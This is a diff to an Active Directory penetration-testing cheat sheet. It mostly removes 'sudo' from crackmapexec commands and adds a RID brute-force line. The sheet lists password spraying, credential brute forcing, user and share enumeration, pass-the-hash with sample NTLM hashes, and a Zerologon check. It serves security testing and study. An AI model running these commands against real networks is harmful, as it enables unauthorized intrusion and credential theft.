@@ -154,6 +154,8 @@ kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt 
 ./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> passwordspray <userlist> '<password>'
 # crackmapexec needs valid credential
 crackmapexec smb <target ip> -u <username> -p <password> --users
+# bruteforcing the RID (enumerate users)
+crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --rid-brute 10000
 ```
 
 change password (STATUS_PASSWORD_MUST_CHANGE)
@@ -371,40 +373,40 @@ targetedKerberoast.py -d <domain> -u <username> -p <password> --dc-ip <dc ip>
 
 ```shell
 # brute forcing, server may block brute-force attack
-sudo crackmapexec <protocol> <target ip> -u <user_list.txt> -p <password_list.txt>
+crackmapexec <protocol> <target ip> -u <user_list.txt> -p <password_list.txt>
 # testing user = password
-sudo crackmapexec <protocol> <target ip> -u <user_list.txt> -p <user_list.txt> --no-bruteforce
+crackmapexec <protocol> <target ip> -u <user_list.txt> -p <user_list.txt> --no-bruteforce
 # bruteforcing the RID (enumerate users)
-sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --rid-brute 10000
+crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --rid-brute 10000
 # check password policy
-sudo crackmapexec <protocol> <target ip> --pass-pol
+crackmapexec <protocol> <target ip> --pass-pol
 # using existing credentials and users to find more credentials 
-sudo crackmapexec <protocol> <target ip> -u /tmp/users.txt -p <password> --continue-on-success
+crackmapexec <protocol> <target ip> -u /tmp/users.txt -p <password> --continue-on-success
 # using low privilege user to enumerate more users
-sudo crackmapexec <protocol> <target ip> -u <username> -p <password> --users
+crackmapexec <protocol> <target ip> -u <username> -p <password> --users
 # using low privilege user to enumerate more groups
-sudo crackmapexec <protocol> <target ip> -u <username> -p <password> --groups
+crackmapexec <protocol> <target ip> -u <username> -p <password> --groups
 # enumerate logged users on multiple servers
-sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --loggedon-users
+crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --loggedon-users
 # enumerate shares on multiple servers
-sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --shares
+crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --shares
 # log on with a local non-domain account
-sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --local-auth
+crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --local-auth
 # enumerate local user shares
-sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --local-auth -shares
+crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --local-auth -shares
 # enumerate active sessions
-sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --session
+crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --session
 # list readable share files
-sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> -M spider_plus
+crackmapexec <protocol> <target ip(s)> -u <username> -p <password> -M spider_plus
 # using NTLM hash (NTDS.dit) to check credentials
 # e.g., Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8a3b1fee7718533175de682804c417a:::
-sudo crackmapexec smb <target ip(s)> -u <username> -H 'LM:NT'
-# sudo crackmapexec smb test.local -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:a8a3b1fee7718533175de682804c417a'
-sudo crackmapexec smb <target ip(s)> -u <username> -H 'NTHASH'
-# sudo crackmapexec smb test.local -u Administrator -H 'a8a3b1fee7718533175de682804c417a'
+crackmapexec smb <target ip(s)> -u <username> -H 'LM:NT'
+# crackmapexec smb test.local -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:a8a3b1fee7718533175de682804c417a'
+crackmapexec smb <target ip(s)> -u <username> -H 'NTHASH'
+# crackmapexec smb test.local -u Administrator -H 'a8a3b1fee7718533175de682804c417a'
 
 # anonymous access
-sudo crackmapexec smb <target ip> -u 'anonymous' -p '' --shares   
+crackmapexec smb <target ip> -u 'anonymous' -p '' --shares   
 
 # Zerologon
 crackmapexec smb <target ip> -u <username> -p <password> -M zerologon
